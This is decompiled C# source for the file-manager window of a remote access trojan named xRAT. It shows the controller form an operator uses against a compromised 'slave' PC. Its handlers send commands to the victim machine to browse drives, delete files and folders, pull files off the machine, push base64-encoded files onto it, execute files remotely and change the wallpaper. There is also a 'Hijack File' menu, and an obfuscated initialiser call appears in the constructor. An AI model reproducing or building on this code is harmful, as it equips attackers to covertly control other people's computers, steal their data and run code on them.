namespace xRAT
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Threading;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class File_Manager : Form
    {
        [AccessedThroughProperty("ComboBox1")]
        private ComboBox _ComboBox1;
        [AccessedThroughProperty("ContextMenuStrip1")]
        private ContextMenuStrip _ContextMenuStrip1;
        [AccessedThroughProperty("DeleteToolStripMenuItem")]
        private ToolStripMenuItem _DeleteToolStripMenuItem;
        [AccessedThroughProperty("DownloadToolStripMenuItem")]
        private ToolStripMenuItem _DownloadToolStripMenuItem;
        [AccessedThroughProperty("ExecuteToolStripMenuItem")]
        private ToolStripMenuItem _ExecuteToolStripMenuItem;
        [AccessedThroughProperty("HijackFileToolStripMenuItem")]
        private ToolStripMenuItem _HijackFileToolStripMenuItem;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("ListView1")]
        private ListView _ListView1;
        [AccessedThroughProperty("OkToolStripMenuItem")]
        private ToolStripMenuItem _OkToolStripMenuItem;
        [AccessedThroughProperty("PicRefresh")]
        private PictureBox _PicRefresh;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("SetToolStripMenuItem")]
        private ToolStripMenuItem _SetToolStripMenuItem;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("ToolStripTextBox1")]
        private ToolStripTextBox _ToolStripTextBox1;
        [AccessedThroughProperty("ToolStripTextBox2")]
        private ToolStripTextBox _ToolStripTextBox2;
        [AccessedThroughProperty("ToolStripTextBox3")]
        private ToolStripTextBox _ToolStripTextBox3;
        [AccessedThroughProperty("UploadFileToolStripMenuItem")]
        private ToolStripMenuItem _UploadFileToolStripMenuItem;
        [AccessedThroughProperty("UploadToolStripMenuItem")]
        private ToolStripMenuItem _UploadToolStripMenuItem;
        [AccessedThroughProperty("ColumnHeader1")]
        private ColumnHeader columnHeader_0;
        [AccessedThroughProperty("ColumnHeader2")]
        private ColumnHeader columnHeader_1;
        private IContainer icontainer_0;
        [AccessedThroughProperty("ImageList1")]
        private ImageList imageList_0;
        private string string_0;
        [AccessedThroughProperty("ToolTip1")]
        private ToolTip toolTip_0;

        public File_Manager()
        {
            Class1.QaIGh5M7cuigS();
            base.Load += new EventHandler(this.File_Manager_Load);
            this.InitializeComponent();
        }

        private void ComboBox1_TextChanged(object sender, EventArgs e)
        {
            string str = this.ComboBox1.Text.Replace(@":\", "");
            Class2.Class4_0.method_6().SendToSelected("DIR|" + str);
            this.ListView1.Items.Clear();
        }

        private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.ListView1.SelectedItems.Count > 0)
            {
                if (this.ListView1.SelectedItems[0].ImageIndex > 0)
                {
                    if (Interaction.MsgBox("Are you sure?", MsgBoxStyle.Question | MsgBoxStyle.YesNo, "Delete File") == MsgBoxResult.Yes)
                    {
                        if (this.TextBox1.Text.EndsWith(@"\"))
                        {
                            Class2.Class4_0.method_6().SendToSelected("DEL|" + this.TextBox1.Text + this.ListView1.SelectedItems[0].Text + "|File");
                            int num = 1;
                            do
                            {
                                Thread.Sleep(10);
                                Application.DoEvents();
                                num++;
                            }
                            while (num <= 20);
                            Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.TextBox1.Text);
                        }
                        else
                        {
                            Class2.Class4_0.method_6().SendToSelected("DEL|" + this.TextBox1.Text + @"\" + this.ListView1.SelectedItems[0].Text + "|File");
                            int num2 = 1;
                            do
                            {
                                Thread.Sleep(10);
                                Application.DoEvents();
                                num2++;
                            }
                            while (num2 <= 20);
                            Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.TextBox1.Text);
                        }
                    }
                }
                else if (((this.ListView1.SelectedItems[0].ImageIndex == 0) & (this.ListView1.SelectedItems.Count > 0)) && (Interaction.MsgBox("Are you sure?", MsgBoxStyle.Question | MsgBoxStyle.YesNo, "Delete Directory") == MsgBoxResult.Yes))
                {
                    if (this.TextBox1.Text.EndsWith(@"\"))
                    {
                        Class2.Class4_0.method_6().SendToSelected("DEL|" + this.TextBox1.Text + this.ListView1.SelectedItems[0].Text + "|Folder");
                        int num3 = 1;
                        do
                        {
                            Thread.Sleep(10);
                            Application.DoEvents();
                            num3++;
                        }
                        while (num3 <= 20);
                        Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.TextBox1.Text);
                    }
                    else
                    {
                        Class2.Class4_0.method_6().SendToSelected("DEL|" + this.TextBox1.Text + @"\" + this.ListView1.SelectedItems[0].Text + "|Folder");
                        int num4 = 1;
                        do
                        {
                            Thread.Sleep(10);
                            Application.DoEvents();
                            num4++;
                        }
                        while (num4 <= 20);
                        Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.TextBox1.Text);
                    }
                }
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if ((this.ListView1.SelectedItems.Count > 0) && (this.ListView1.SelectedItems[0].ImageIndex > 0))
            {
                Class2.Class4_0.method_6().SendToSelected("Extraditle|" + this.TextBox1.Text + @"\" + this.ListView1.SelectedItems[0].Text.ToString());
            }
        }

        private void ExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if ((this.ListView1.SelectedItems.Count > 0) && (this.ListView1.SelectedItems[0].ImageIndex > 0))
            {
                if (this.TextBox1.Text.EndsWith(@"\"))
                {
                    Class2.Class4_0.method_6().SendToSelected("PRCSTART|" + this.TextBox1.Text + this.ListView1.SelectedItems[0].Text);
                }
                else
                {
                    Class2.Class4_0.method_6().SendToSelected("PRCSTART|" + this.TextBox1.Text + @"\" + this.ListView1.SelectedItems[0].Text);
                }
            }
        }

        private void File_Manager_Load(object sender, EventArgs e)
        {
            this.string_0 = Class2.Class4_0.method_6().lstClients.SelectedItems[0].Text.ToString();
            this.Text = "File Manager - " + this.string_0;
            Class2.Class4_0.method_6().SendToSelected("GETDRIVES");
            this.Label2.Text = null;
            this.TextBox1.Text = @"Drive:\";
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            this.icontainer_0 = new System.ComponentModel.Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(File_Manager));
            this.ListView1 = new ListView();
            this.ColumnHeader1 = new ColumnHeader();
            this.ColumnHeader2 = new ColumnHeader();
            this.ContextMenuStrip1 = new ContextMenuStrip(this.icontainer_0);
            this.DownloadToolStripMenuItem = new ToolStripMenuItem();
            this.UploadFileToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox2 = new ToolStripTextBox();
            this.ToolStripTextBox3 = new ToolStripTextBox();
            this.UploadToolStripMenuItem = new ToolStripMenuItem();
            this.ExecuteToolStripMenuItem = new ToolStripMenuItem();
            this.SetToolStripMenuItem = new ToolStripMenuItem();
            this.HijackFileToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox1 = new ToolStripTextBox();
            this.OkToolStripMenuItem = new ToolStripMenuItem();
            this.DeleteToolStripMenuItem = new ToolStripMenuItem();
            this.ImageList1 = new ImageList(this.icontainer_0);
            this.ComboBox1 = new ComboBox();
            this.Label1 = new Label();
            this.TextBox1 = new TextBox();
            this.Label2 = new Label();
            this.ToolTip1 = new ToolTip(this.icontainer_0);
            this.PictureBox1 = new PictureBox();
            this.PicRefresh = new PictureBox();
            this.ContextMenuStrip1.SuspendLayout();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            ((ISupportInitialize) this.PicRefresh).BeginInit();
            this.SuspendLayout();
            this.ListView1.Columns.AddRange(new ColumnHeader[] { this.ColumnHeader1, this.ColumnHeader2 });
            this.ListView1.ContextMenuStrip = this.ContextMenuStrip1;
            this.ListView1.FullRowSelect = true;
            this.ListView1.GridLines = true;
            Point point = new Point(12, 0x27);
            this.ListView1.Location = point;
            this.ListView1.MultiSelect = false;
            this.ListView1.Name = "ListView1";
            Size size = new Size(0x236, 280);
            this.ListView1.Size = size;
            this.ListView1.SmallImageList = this.ImageList1;
            this.ListView1.TabIndex = 0;
            this.ListView1.UseCompatibleStateImageBehavior = false;
            this.ListView1.View = View.Details;
            this.ColumnHeader1.Text = "Name";
            this.ColumnHeader1.Width = 0xff;
            this.ColumnHeader2.Text = "Size";
            this.ColumnHeader2.Width = 0x5f;
            this.ContextMenuStrip1.Items.AddRange(new ToolStripItem[] { this.DownloadToolStripMenuItem, this.UploadFileToolStripMenuItem, this.ExecuteToolStripMenuItem, this.SetToolStripMenuItem, this.HijackFileToolStripMenuItem, this.DeleteToolStripMenuItem });
            this.ContextMenuStrip1.Name = "ContextMenuStrip1";
            size = new Size(200, 0x9e);
            this.ContextMenuStrip1.Size = size;
            this.DownloadToolStripMenuItem.Image = (Image) manager.GetObject("DownloadToolStripMenuItem.Image");
            this.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem";
            size = new Size(0xc7, 0x16);
            this.DownloadToolStripMenuItem.Size = size;
            this.DownloadToolStripMenuItem.Text = "Download File";
            this.UploadFileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox2, this.ToolStripTextBox3, this.UploadToolStripMenuItem });
            this.UploadFileToolStripMenuItem.Image = Class5.smethod_89();
            this.UploadFileToolStripMenuItem.Name = "UploadFileToolStripMenuItem";
            size = new Size(0xc7, 0x16);
            this.UploadFileToolStripMenuItem.Size = size;
            this.UploadFileToolStripMenuItem.Text = "Upload File";
            this.ToolStripTextBox2.Name = "ToolStripTextBox2";
            size = new Size(100, 0x15);
            this.ToolStripTextBox2.Size = size;
            this.ToolStripTextBox2.Text = @"C:\myfile.txt";
            this.ToolStripTextBox3.Name = "ToolStripTextBox3";
            size = new Size(100, 0x15);
            this.ToolStripTextBox3.Size = size;
            this.ToolStripTextBox3.Text = @"C:\in_slave_pc.txt";
            this.UploadToolStripMenuItem.Image = Class5.smethod_7();
            this.UploadToolStripMenuItem.Name = "UploadToolStripMenuItem";
            size = new Size(160, 0x16);
            this.UploadToolStripMenuItem.Size = size;
            this.UploadToolStripMenuItem.Text = ":: Upload ::";
            this.ExecuteToolStripMenuItem.Image = (Image) manager.GetObject("ExecuteToolStripMenuItem.Image");
            this.ExecuteToolStripMenuItem.Name = "ExecuteToolStripMenuItem";
            size = new Size(0xc7, 0x16);
            this.ExecuteToolStripMenuItem.Size = size;
            this.ExecuteToolStripMenuItem.Text = "Execute File";
            this.SetToolStripMenuItem.Image = (Image) manager.GetObject("SetToolStripMenuItem.Image");
            this.SetToolStripMenuItem.Name = "SetToolStripMenuItem";
            size = new Size(0xc7, 0x16);
            this.SetToolStripMenuItem.Size = size;
            this.SetToolStripMenuItem.Text = "Set picture to wallpaper";
            this.HijackFileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox1, this.OkToolStripMenuItem });
            this.HijackFileToolStripMenuItem.Image = (Image) manager.GetObject("HijackFileToolStripMenuItem.Image");
            this.HijackFileToolStripMenuItem.Name = "HijackFileToolStripMenuItem";
            size = new Size(0xc7, 0x16);
            this.HijackFileToolStripMenuItem.Size = size;
            this.HijackFileToolStripMenuItem.Text = "Hijack File";
            this.ToolStripTextBox1.Name = "ToolStripTextBox1";
            size = new Size(100, 0x15);
            this.ToolStripTextBox1.Size = size;
            this.ToolStripTextBox1.Text = "password";
            this.OkToolStripMenuItem.Image = Class5.smethod_7();
            this.OkToolStripMenuItem.Name = "OkToolStripMenuItem";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem.Size = size;
            this.OkToolStripMenuItem.Text = ":: Ok ::";
            this.DeleteToolStripMenuItem.Image = Class5.smethod_6();
            this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
            size = new Size(0xc7, 0x16);
            this.DeleteToolStripMenuItem.Size = size;
            this.DeleteToolStripMenuItem.Text = "Delete File";
            this.ImageList1.ImageStream = (ImageListStreamer) manager.GetObject("ImageList1.ImageStream");
            this.ImageList1.TransparentColor = Color.Transparent;
            this.ImageList1.Images.SetKeyName(0, "Actions-document-open-folder-icon.png");
            this.ImageList1.Images.SetKeyName(1, "Documents-icon.png");
            this.ImageList1.Images.SetKeyName(2, "Text-Document-icon.png");
            this.ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
            this.ComboBox1.FlatStyle = FlatStyle.Popup;
            this.ComboBox1.FormattingEnabled = true;
            point = new Point(0x20f, 9);
            this.ComboBox1.Location = point;
            this.ComboBox1.MaxDropDownItems = 20;
            this.ComboBox1.Name = "ComboBox1";
            size = new Size(0x33, 0x15);
            this.ComboBox1.Size = size;
            this.ComboBox1.TabIndex = 1;
            this.Label1.AutoSize = true;
            point = new Point(0x1e6, 12);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            size = new Size(0x24, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 2;
            this.Label1.Text = "Drive:";
            this.TextBox1.BorderStyle = BorderStyle.None;
            point = new Point(12, 12);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            this.TextBox1.ReadOnly = true;
            size = new Size(0x1d4, 14);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 3;
            this.TextBox1.Text = @"Drive:\";
            this.Label2.AutoSize = true;
            this.Label2.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            point = new Point(12, 0x147);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0x12, 15);
            this.Label2.Size = size;
            this.Label2.TabIndex = 4;
            this.Label2.Text = "%";
            this.PictureBox1.Cursor = Cursors.Hand;
            this.PictureBox1.Image = Class5.smethod_34();
            point = new Point(540, 0x147);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            size = new Size(0x10, 0x10);
            this.PictureBox1.Size = size;
            this.PictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;
            this.PictureBox1.TabIndex = 6;
            this.PictureBox1.TabStop = false;
            this.ToolTip1.SetToolTip(this.PictureBox1, "Open download folder");
            this.PicRefresh.Cursor = Cursors.Hand;
            this.PicRefresh.Image = Class5.smethod_5();
            point = new Point(0x232, 0x147);
            this.PicRefresh.Location = point;
            this.PicRefresh.Name = "PicRefresh";
            size = new Size(0x10, 0x10);
            this.PicRefresh.Size = size;
            this.PicRefresh.SizeMode = PictureBoxSizeMode.AutoSize;
            this.PicRefresh.TabIndex = 5;
            this.PicRefresh.TabStop = false;
            this.ToolTip1.SetToolTip(this.PicRefresh, "Refresh Directory");
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(590, 0x15f);
            this.ClientSize = size;
            this.Controls.Add(this.PictureBox1);
            this.Controls.Add(this.TextBox1);
            this.Controls.Add(this.PicRefresh);
            this.Controls.Add(this.ComboBox1);
            this.Controls.Add(this.Label1);
            this.Controls.Add(this.ListView1);
            this.Controls.Add(this.Label2);
            this.FormBorderStyle = FormBorderStyle.Fixed3D;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "File_Manager";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "File Manager";
            this.ContextMenuStrip1.ResumeLayout(false);
            ((ISupportInitialize) this.PictureBox1).EndInit();
            ((ISupportInitialize) this.PicRefresh).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void ListView1_DoubleClick(object sender, EventArgs e)
        {
            if ((this.ListView1.SelectedItems.Count > 0) && (this.ListView1.SelectedItems[0].ImageIndex == 0))
            {
                if (this.ListView1.SelectedItems[0].Text == @"\")
                {
                    Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.ComboBox1.Text);
                }
                else if (this.ListView1.SelectedItems[0].Text == "..")
                {
                    string str2 = this.TextBox1.Text.Replace(@":\", "");
                    if (str2.Length == 1)
                    {
                        Class2.Class4_0.method_6().SendToSelected("DIR|" + str2);
                    }
                    else
                    {
                        string[] strArray = this.TextBox1.Text.Split(new char[] { '\\' });
                        string str = "";
                        int num2 = strArray.Length - 2;
                        for (int i = 0; i <= num2; i++)
                        {
                            str = str + strArray[i] + @"\";
                        }
                        str = str.Remove(str.Length - 1);
                        if ((str.Length < 3) & str.Contains(":"))
                        {
                            str = str + @"\";
                        }
                        Class2.Class4_0.method_6().SendToSelected("READDIR|" + str);
                    }
                }
                else if (this.TextBox1.Text.EndsWith(@"\"))
                {
                    Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.TextBox1.Text + this.ListView1.SelectedItems[0].Text);
                }
                else
                {
                    Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.TextBox1.Text + @"\" + this.ListView1.SelectedItems[0].Text);
                }
            }
        }

        private void OkToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void PicRefresh_Click(object sender, EventArgs e)
        {
            Class2.Class4_0.method_6().SendToSelected("READDIR|" + this.TextBox1.Text);
        }

        private void PictureBox1_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(Application.StartupPath + @"\Users"))
            {
                Directory.CreateDirectory(Application.StartupPath + @"\Users");
            }
            if (!Directory.Exists(Application.StartupPath + @"\Users\" + this.string_0))
            {
                Directory.CreateDirectory(Application.StartupPath + @"\Users\" + this.string_0);
            }
            ProcessStartInfo startInfo = new ProcessStartInfo {
                Arguments = "/e,/select," + Application.StartupPath + @"\Users\" + this.string_0 + "",
                FileName = "explorer.exe"
            };
            System.Diagnostics.Process.Start(startInfo);
        }

        private void SetToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if ((this.ListView1.SelectedItems.Count > 0) && (this.ListView1.SelectedItems[0].ImageIndex > 0))
            {
                if (this.TextBox1.Text.EndsWith(@"\"))
                {
                    Class2.Class4_0.method_6().SendToSelected("FILEWALPA|" + this.TextBox1.Text + this.ListView1.SelectedItems[0].Text);
                }
                else
                {
                    Class2.Class4_0.method_6().SendToSelected("FILEWALPA|" + this.TextBox1.Text + @"\" + this.ListView1.SelectedItems[0].Text);
                }
            }
        }

        private void UploadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if ((this.ListView1.SelectedItems.Count > 0) && (this.ListView1.SelectedItems[0].ImageIndex > 0))
            {
                byte[] inArray = File.ReadAllBytes(this.ToolStripTextBox2.Text);
                Class2.Class4_0.method_6().SendToSelected("UPFILE|" + Convert.ToBase64String(inArray) + "|" + this.ToolStripTextBox3.Text);
            }
        }

        internal virtual ColumnHeader ColumnHeader1
        {
            get
            {
                return this.columnHeader_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_0 = value;
            }
        }

        internal virtual ColumnHeader ColumnHeader2
        {
            get
            {
                return this.columnHeader_1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_1 = value;
            }
        }

        internal virtual ComboBox ComboBox1
        {
            get
            {
                return this._ComboBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ComboBox1_TextChanged);
                if (this._ComboBox1 != null)
                {
                    this._ComboBox1.TextChanged -= handler;
                }
                this._ComboBox1 = value;
                if (this._ComboBox1 != null)
                {
                    this._ComboBox1.TextChanged += handler;
                }
            }
        }

        internal virtual ContextMenuStrip ContextMenuStrip1
        {
            get
            {
                return this._ContextMenuStrip1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ContextMenuStrip1 = value;
            }
        }

        internal virtual ToolStripMenuItem DeleteToolStripMenuItem
        {
            get
            {
                return this._DeleteToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.DeleteToolStripMenuItem_Click);
                if (this._DeleteToolStripMenuItem != null)
                {
                    this._DeleteToolStripMenuItem.Click -= handler;
                }
                this._DeleteToolStripMenuItem = value;
                if (this._DeleteToolStripMenuItem != null)
                {
                    this._DeleteToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem DownloadToolStripMenuItem
        {
            get
            {
                return this._DownloadToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.DownloadToolStripMenuItem_Click);
                if (this._DownloadToolStripMenuItem != null)
                {
                    this._DownloadToolStripMenuItem.Click -= handler;
                }
                this._DownloadToolStripMenuItem = value;
                if (this._DownloadToolStripMenuItem != null)
                {
                    this._DownloadToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ExecuteToolStripMenuItem
        {
            get
            {
                return this._ExecuteToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ExecuteToolStripMenuItem_Click);
                if (this._ExecuteToolStripMenuItem != null)
                {
                    this._ExecuteToolStripMenuItem.Click -= handler;
                }
                this._ExecuteToolStripMenuItem = value;
                if (this._ExecuteToolStripMenuItem != null)
                {
                    this._ExecuteToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem HijackFileToolStripMenuItem
        {
            get
            {
                return this._HijackFileToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._HijackFileToolStripMenuItem = value;
            }
        }

        internal virtual ImageList ImageList1
        {
            get
            {
                return this.imageList_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.imageList_0 = value;
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual ListView ListView1
        {
            get
            {
                return this._ListView1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ListView1_DoubleClick);
                if (this._ListView1 != null)
                {
                    this._ListView1.DoubleClick -= handler;
                }
                this._ListView1 = value;
                if (this._ListView1 != null)
                {
                    this._ListView1.DoubleClick += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem
        {
            get
            {
                return this._OkToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem_Click);
                if (this._OkToolStripMenuItem != null)
                {
                    this._OkToolStripMenuItem.Click -= handler;
                }
                this._OkToolStripMenuItem = value;
                if (this._OkToolStripMenuItem != null)
                {
                    this._OkToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual PictureBox PicRefresh
        {
            get
            {
                return this._PicRefresh;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.PicRefresh_Click);
                if (this._PicRefresh != null)
                {
                    this._PicRefresh.Click -= handler;
                }
                this._PicRefresh = value;
                if (this._PicRefresh != null)
                {
                    this._PicRefresh.Click += handler;
                }
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.PictureBox1_Click);
                if (this._PictureBox1 != null)
                {
                    this._PictureBox1.Click -= handler;
                }
                this._PictureBox1 = value;
                if (this._PictureBox1 != null)
                {
                    this._PictureBox1.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem SetToolStripMenuItem
        {
            get
            {
                return this._SetToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.SetToolStripMenuItem_Click);
                if (this._SetToolStripMenuItem != null)
                {
                    this._SetToolStripMenuItem.Click -= handler;
                }
                this._SetToolStripMenuItem = value;
                if (this._SetToolStripMenuItem != null)
                {
                    this._SetToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox1
        {
            get
            {
                return this._ToolStripTextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox1 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox2
        {
            get
            {
                return this._ToolStripTextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox2 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox3
        {
            get
            {
                return this._ToolStripTextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox3 = value;
            }
        }

        internal virtual ToolTip ToolTip1
        {
            get
            {
                return this.toolTip_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.toolTip_0 = value;
            }
        }

        internal virtual ToolStripMenuItem UploadFileToolStripMenuItem
        {
            get
            {
                return this._UploadFileToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.UploadFileToolStripMenuItem_Click);
                if (this._UploadFileToolStripMenuItem != null)
                {
                    this._UploadFileToolStripMenuItem.Click -= handler;
                }
                this._UploadFileToolStripMenuItem = value;
                if (this._UploadFileToolStripMenuItem != null)
                {
                    this._UploadFileToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem UploadToolStripMenuItem
        {
            get
            {
                return this._UploadToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.UploadToolStripMenuItem_Click);
                if (this._UploadToolStripMenuItem != null)
                {
                    this._UploadToolStripMenuItem.Click -= handler;
                }
                this._UploadToolStripMenuItem = value;
                if (this._UploadToolStripMenuItem != null)
                {
                    this._UploadToolStripMenuItem.Click += handler;
                }
            }
        }
    }
}

